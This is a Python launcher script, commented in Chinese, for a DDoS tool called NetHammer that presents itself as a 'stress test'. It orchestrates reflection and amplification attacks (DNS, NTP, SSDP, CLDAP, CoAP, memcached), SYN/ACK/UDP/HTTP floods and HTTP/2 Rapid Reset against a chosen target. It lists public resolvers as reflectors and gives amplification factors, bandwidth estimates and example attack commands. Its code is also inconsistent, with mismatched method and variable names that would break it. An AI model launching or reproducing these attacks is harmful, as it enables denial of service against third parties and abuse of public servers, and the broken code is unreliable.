#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
NetHammer 一键压力测试脚本
简化版本，快速启动网络压力测试
"""

import os
import sys
import time
import subprocess
import threading
from datetime import datetime

class QuickTester:
    def __init__(self):
        self.test_processes = []
        
    def log(self, message):
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"[{timestamp}] {message}")
    
    def check_tools(self):
        """检查攻击工具是否存在"""
        tools = ['DNS', 'ntp', 'ssdp', 'udp', 'syn']
        missing_tools = []

        for tool in tools:
            if not os.path.exists(f"./attack_tools/{tool}"):
                missing_tools.append(tool)

        if missing_tools:
            self.log(f"缺少攻击工具: {missing_tools}")
            return False
        return True
    
    def create_default_reflectors(self):
        """创建默认反射器列表"""
        # DNS服务器列表
        dns_servers = """8.8.8.8 google.com
1.1.1.1 cloudflare.com
208.67.222.222 opendns.com
9.9.9.9 quad9.net
77.88.8.8 yandex.com
156.154.70.1 neustar.biz
8.26.56.26 comodo.com
64.6.64.6 verisign.com"""
        
        with open("dns_list.txt", "w") as f:
            f.write(dns_servers)
        
        # NTP服务器列表 (示例，实际需要扫描)
        ntp_servers = """129.6.15.28
129.6.15.29
132.163.96.1
132.163.96.2
216.229.0.179"""
        
        with open("ntp_list.txt", "w") as f:
            f.write(ntp_servers)
        
        # SSDP设备列表 (示例，实际需要扫描)
        ssdp_devices = """192.168.1.1
192.168.1.254
10.0.0.1
172.16.0.1"""
        
        with open("ssdp_list.txt", "w") as f:
            f.write(ssdp_devices)
        
        self.log("已创建默认反射器列表")
    
    def launch_test(self, test_type, target_ip, target_port, threads=50, duration=300):
        """启动单个压力测试"""
        # 测试工具映射
        tool_mapping = {
            # 2024-2025年新测试方法
            'http2': 'http2_rapid_reset',
            'cldap': 'cldap_amplification',
            'coap': 'coap_amplification',

            # 经典测试方法
            'dns': 'DNS',
            'ntp': 'ntp',
            'ssdp': 'ssdp',
            'udp': 'udp',
            'syn': 'syn',
            'ack': 'ack',
            'http': 'http',
            'memcached': 'memc'
        }

        # 获取实际工具名
        tool_name = tool_mapping.get(test_type.lower(), test_type)
        tool_path = f"./attack_tools/{tool_name}"

        # 检查工具是否存在
        if not os.path.exists(tool_path):
            self.log(f"攻击工具不存在: {tool_path}")
            return False

        # 构造命令
        if attack_type.lower() == "http2":
            cmd = f"{tool_path} {target_ip} {target_port} {threads} {duration}"
        elif attack_type.lower() == "cldap":
            cmd = f"{tool_path} {target_ip} {target_port} cldap_list.txt {threads} {duration}"
        elif attack_type.lower() == "coap":
            cmd = f"{tool_path} {target_ip} {target_port} coap_list.txt {threads} {duration}"
        elif attack_type.lower() == "dns":
            cmd = f"{tool_path} {target_ip} {target_port} dns_list.txt {threads} {duration}"
        elif attack_type.lower() == "ntp":
            cmd = f"{tool_path} {target_ip} {target_port} ntp_list.txt {threads} -1 {duration}"
        elif attack_type.lower() == "ssdp":
            cmd = f"{tool_path} {target_ip} {target_port} ssdp_list.txt {threads} -1 {duration}"
        elif attack_type.lower() == "memcached":
            cmd = f"{tool_path} {target_ip} {target_port} memcached_list.txt {threads} {duration}"
        elif attack_type.lower() in ["udp", "syn", "ack"]:
            cmd = f"{tool_path} {target_ip} {target_port} {threads} {duration}"
        elif attack_type.lower() == "http":
            cmd = f"{tool_path} {target_ip} {target_port} {threads} {duration}"
        else:
            self.log(f"不支持的攻击类型: {attack_type}")
            return False

        self.log(f"启动 {attack_type.upper()} 攻击 ({threads}线程)...")
        self.log(f"执行命令: {cmd}")

        try:
            process = subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.attack_processes.append({
                'type': attack_type,
                'process': process,
                'cmd': cmd,
                'threads': threads,
                'start_time': time.time()
            })
            return True
        except Exception as e:
            self.log(f"启动失败: {e}")
            return False
    
    def get_optimal_threads(self, attack_method):
        """获取最优线程数"""
        optimal_threads = {
            # 2024-2025年新攻击方法
            'http2': 200,      # HTTP/2 Rapid Reset
            'cldap': 80,       # CLDAP反射攻击
            'coap': 60,        # CoAP放大攻击

            # 经典攻击方法
            'dns': 100,
            'ntp': 50,
            'ssdp': 80,
            'udp': 200,
            'syn': 500,
            'ack': 300,
            'http': 100
        }
        return optimal_threads.get(attack_method, 100)

    def single_attack(self, target_ip, target_port, method, threads, duration):
        """单一攻击方法"""
        self.log("=" * 50)
        self.log(f"启动 {method.upper()} 攻击")
        self.log(f"目标: {target_ip}:{target_port}")
        self.log(f"线程: {threads}")
        self.log(f"持续时间: {duration}秒")
        self.log("=" * 50)

        # 检查工具
        if not self.check_tools():
            self.log("请先编译攻击工具")
            return

        # 创建反射器列表
        self.create_default_reflectors()

        # 启动攻击
        if self.launch_attack(method, target_ip, target_port, threads, duration):
            self.log(f"✅ {method.upper()} 攻击已启动")

            # 监控攻击状态
            try:
                for i in range(duration // 30):
                    time.sleep(30)
                    self.show_status()
            except KeyboardInterrupt:
                self.log("收到停止信号")
        else:
            self.log(f"❌ {method.upper()} 攻击启动失败")

        self.stop_all()

    def combo_attack(self, target_ip, target_port, methods, threads, duration):
        """组合攻击"""
        self.log("=" * 50)
        self.log("启动组合DDoS攻击")
        self.log(f"目标: {target_ip}:{target_port}")
        self.log(f"方法: {', '.join(methods)}")
        self.log(f"持续时间: {duration}秒")
        self.log("=" * 50)

        # 检查工具
        if not self.check_tools():
            self.log("请先编译攻击工具")
            return

        # 创建反射器列表
        self.create_default_reflectors()

        # 启动多种攻击
        for method in methods:
            method = method.strip()
            attack_threads = threads if threads > 0 else self.get_optimal_threads(method)

            if self.launch_attack(method, target_ip, target_port, attack_threads, duration):
                self.log(f"✅ {method.upper()} 攻击已启动 ({attack_threads}线程)")
                time.sleep(2)  # 间隔启动
            else:
                self.log(f"❌ {method.upper()} 攻击启动失败")

        self.log(f"已启动 {len(self.attack_processes)} 个攻击向量")

        # 监控攻击状态
        try:
            for i in range(duration // 30):
                time.sleep(30)
                self.show_status()
        except KeyboardInterrupt:
            self.log("收到停止信号")

        self.stop_all()

    def multi_attack(self, target_ip, target_port, duration=300):
        """多重攻击 (预设组合)"""
        self.log("=" * 50)
        self.log("启动多重DDoS攻击")
        self.log(f"目标: {target_ip}:{target_port}")
        self.log(f"持续时间: {duration}秒")
        self.log("=" * 50)

        # 检查工具
        if not self.check_tools():
            self.log("请先编译攻击工具")
            return

        # 创建反射器列表
        self.create_default_reflectors()

        # 2025年最新攻击组合 (包含新技术)
        attacks = [
            ("http2", 150),  # HTTP/2 Rapid Reset攻击，150线程
            ("cldap", 80),   # CLDAP反射攻击，80线程
            ("dns", 100),    # DNS放大攻击，100线程
            ("udp", 200),    # UDP洪水，200线程
        ]

        for attack_type, threads in attacks:
            if self.launch_attack(attack_type, target_ip, target_port, threads, duration):
                self.log(f"✅ {attack_type} 攻击已启动 ({threads}线程)")
                time.sleep(2)  # 间隔启动
            else:
                self.log(f"❌ {attack_type} 攻击启动失败")

        self.log(f"已启动 {len(self.attack_processes)} 个攻击向量")

        # 监控攻击状态
        try:
            for i in range(duration // 30):
                time.sleep(30)
                self.show_status()
        except KeyboardInterrupt:
            self.log("收到停止信号")

        self.stop_all()
    
    def show_status(self):
        """显示攻击状态"""
        if not self.attack_processes:
            self.log("当前没有运行的攻击")
            return

        running = 0
        self.log("=" * 60)
        self.log("📊 攻击状态监控")
        self.log("=" * 60)

        for i, attack in enumerate(self.attack_processes):
            status = "🟢 运行中" if attack['process'].poll() is None else "🔴 已停止"
            if attack['process'].poll() is None:
                running += 1

            runtime = int(time.time() - attack.get('start_time', time.time()))
            threads = attack.get('threads', 'N/A')

            self.log(f"{i+1}. {attack['type'].upper():8} | {status:8} | "
                    f"线程:{threads:4} | 运行:{runtime:4}秒")

        self.log("=" * 60)
        self.log(f"📈 总计: {running}/{len(self.attack_processes)} 个攻击进程运行中")

        # 显示系统资源使用情况
        try:
            import psutil
            cpu_percent = psutil.cpu_percent()
            memory_percent = psutil.virtual_memory().percent
            self.log(f"💻 系统: CPU {cpu_percent:.1f}% | 内存 {memory_percent:.1f}%")
        except ImportError:
            pass

        self.log("=" * 60)
    
    def stop_all(self):
        """停止所有攻击"""
        self.log("停止所有攻击...")
        
        for attack in self.attack_processes:
            try:
                if attack['process'].poll() is None:
                    attack['process'].terminate()
                    time.sleep(1)
                    if attack['process'].poll() is None:
                        attack['process'].kill()
            except:
                pass
        
        self.log("所有攻击已停止")

def show_banner():
    banner = """
    ███╗   ██╗███████╗████████╗██╗  ██╗ █████╗ ███╗   ███╗███╗   ███╗███████╗██████╗
    ████╗  ██║██╔════╝╚══██╔══╝██║  ██║██╔══██╗████╗ ████║████╗ ████║██╔════╝██╔══██╗
    ██╔██╗ ██║█████╗     ██║   ███████║███████║██╔████╔██║██╔████╔██║█████╗  ██████╔╝
    ██║╚██╗██║██╔══╝     ██║   ██╔══██║██╔══██║██║╚██╔╝██║██║╚██╔╝██║██╔══╝  ██╔══██╗
    ██║ ╚████║███████╗   ██║   ██║  ██║██║  ██║██║ ╚═╝ ██║██║ ╚═╝ ██║███████╗██║  ██║
    ╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝

                            一键DDoS攻击工具 v2.0
                        ⚠️  仅用于授权测试  ⚠️
    """
    print(banner)

def show_help():
    help_text = """
🎯 NetHammer 攻击参数说明

📋 基本用法:
  python3 quick_attack.py <目标IP> [选项]

📋 参数说明:
  目标IP          必需参数，攻击目标的IP地址或域名
  -p, --port      目标端口 (默认: 80)
  -t, --time      攻击持续时间/秒 (默认: 300)
  -m, --method    攻击方法 (默认: multi)
  -c, --threads   并发线程数 (默认: 自动)
  --list          显示所有攻击方法

📋 攻击方法:
  🔥 2024-2025年最新攻击:
  http2           HTTP/2 Rapid Reset (CVE-2023-44487)
  cldap           CLDAP反射攻击 (46-55倍放大)
  coap            CoAP放大攻击 (IoT设备)

  📋 经典攻击方法:
  multi           多重攻击 (包含最新技术)
  dns             DNS放大攻击 (28-54倍)
  ntp             NTP放大攻击 (556倍)
  ssdp            SSDP放大攻击 (30倍)
  udp             UDP洪水攻击
  syn             SYN洪水攻击
  ack             ACK洪水攻击
  http            HTTP洪水攻击

📋 使用示例:
  # 基本攻击 (多重攻击，80端口，5分钟)
  python3 quick_attack.py 192.168.1.100

  # 指定端口和时间
  python3 quick_attack.py 192.168.1.100 -p 443 -t 600

  # 指定攻击方法
  python3 quick_attack.py 192.168.1.100 -m dns -c 100

  # DNS放大攻击，1000线程，10分钟
  python3 quick_attack.py example.com -p 80 -m dns -c 1000 -t 600

  # HTTP攻击，500并发，30分钟
  python3 quick_attack.py target.com -p 443 -m http -c 500 -t 1800

📋 高级用法:
  # 组合攻击 (同时使用多种方法)
  python3 quick_attack.py 192.168.1.100 -m "dns,udp,syn" -t 900

  # 最大强度攻击
  python3 quick_attack.py 192.168.1.100 -m multi -c 200 -t 3600

⚠️  重要提醒: 仅用于授权测试，违法使用后果自负！
"""
    print(help_text)

def parse_arguments():
    """解析命令行参数"""
    import argparse

    parser = argparse.ArgumentParser(description='NetHammer 一键攻击工具', add_help=False)
    parser.add_argument('target', nargs='?', help='目标IP地址或域名')
    parser.add_argument('-p', '--port', type=int, default=80, help='目标端口 (默认: 80)')
    parser.add_argument('-t', '--time', type=int, default=300, help='攻击持续时间/秒 (默认: 300)')
    parser.add_argument('-m', '--method', default='multi', help='攻击方法 (默认: multi)')
    parser.add_argument('-c', '--threads', type=int, default=0, help='并发线程数 (默认: 自动)')
    parser.add_argument('-h', '--help', action='store_true', help='显示帮助信息')
    parser.add_argument('--list', action='store_true', help='显示所有攻击方法')

    return parser.parse_args()

def show_attack_methods():
    """显示所有攻击方法"""
    methods = """
🎯 NetHammer 攻击方法详解

🔥 2024-2025年最新攻击 (强烈推荐):
  http2           HTTP/2 Rapid Reset攻击
                  ├─ CVE编号: CVE-2023-44487
                  ├─ 攻击效果: 极强 (398M RPS记录)
                  ├─ 目标: 所有HTTP/2服务器
                  └─ 推荐线程: 100-300

  cldap           CLDAP反射放大攻击
                  ├─ 放大倍数: 46-55倍
                  ├─ 2025年Q1增长: 3,488%
                  ├─ 攻击效果: 极高
                  └─ 推荐线程: 50-100

  coap            CoAP放大攻击
                  ├─ 放大倍数: 10-40倍
                  ├─ 目标: IoT设备
                  ├─ 攻击效果: 高
                  └─ 推荐线程: 30-80

📋 经典放大攻击:
  dns             DNS放大攻击
                  ├─ 放大倍数: 28-54倍
                  ├─ 消耗带宽: 低
                  ├─ 攻击效果: 高
                  └─ 推荐线程: 50-200

  ntp             NTP放大攻击
                  ├─ 放大倍数: 556倍
                  ├─ 消耗带宽: 极低
                  ├─ 攻击效果: 高 (多数已修复)
                  └─ 推荐线程: 20-50

  ssdp            SSDP放大攻击
                  ├─ 放大倍数: 30倍
                  ├─ 消耗带宽: 低
                  ├─ 攻击效果: 中高
                  └─ 推荐线程: 50-100

📋 直接攻击:
  udp             UDP洪水攻击
                  ├─ 放大倍数: 1倍
                  ├─ 消耗带宽: 高
                  ├─ 攻击效果: 中
                  └─ 推荐线程: 100-500

  syn             SYN洪水攻击
                  ├─ 攻击目标: 连接表
                  ├─ 消耗带宽: 中
                  ├─ 攻击效果: 高
                  └─ 推荐线程: 100-1000

  ack             ACK洪水攻击
                  ├─ 攻击目标: 防火墙
                  ├─ 消耗带宽: 中
                  ├─ 攻击效果: 中
                  └─ 推荐线程: 100-500

  http            HTTP洪水攻击
                  ├─ 攻击目标: Web服务
                  ├─ 消耗带宽: 中
                  ├─ 攻击效果: 高
                  └─ 推荐线程: 50-200

📋 组合攻击:
  multi           多重攻击 (推荐)
                  ├─ 包含: DNS+UDP+SYN
                  ├─ 攻击效果: 最高
                  ├─ 难以防护: 是
                  └─ 推荐场景: 综合测试

📋 效果对比:
  攻击方法        单VPS效果      推荐场景
  ────────────────────────────────────
  dns             4-8Gbps       Web服务器
  ntp             10-50Gbps     任何目标
  ssdp            2-5Gbps       IoT设备
  udp             500Mbps       游戏服务器
  syn             高连接消耗     Web应用
  http            应用层瘫痪     网站服务
  multi           15-30Gbps     综合测试
"""
    print(methods)

def main():
    args = parse_arguments()

    if args.help:
        show_help()
        return

    if args.list:
        show_attack_methods()
        return

    if not args.target:
        show_banner()
        print("❌ 缺少目标IP参数")
        print("使用 -h 查看帮助信息")
        return

    show_banner()

    if os.geteuid() != 0:
        print("❌ 需要root权限运行")
        sys.exit(1)

    # 显示攻击配置
    print("🎯 攻击配置:")
    print(f"   目标: {args.target}:{args.port}")
    print(f"   方法: {args.method}")
    print(f"   时间: {args.time}秒 ({args.time//60}分钟)")
    if args.threads > 0:
        print(f"   线程: {args.threads}")
    else:
        print(f"   线程: 自动优化")

    # 确认攻击
    confirm = input("\n确认开始攻击? (y/N): ")
    if confirm.lower() != 'y':
        print("攻击已取消")
        return

    tester = QuickTester()

    # 根据测试方法执行
    if args.method == 'multi':
        tester.multi_test(args.target, args.port, args.time)
    elif ',' in args.method:
        # 组合测试
        methods = args.method.split(',')
        tester.combo_test(args.target, args.port, methods, args.threads, args.time)
    else:
        # 单一测试
        threads = args.threads if args.threads > 0 else tester.get_optimal_threads(args.method)
        tester.single_test(args.target, args.port, args.method, threads, args.time)

if __name__ == "__main__":
    main()
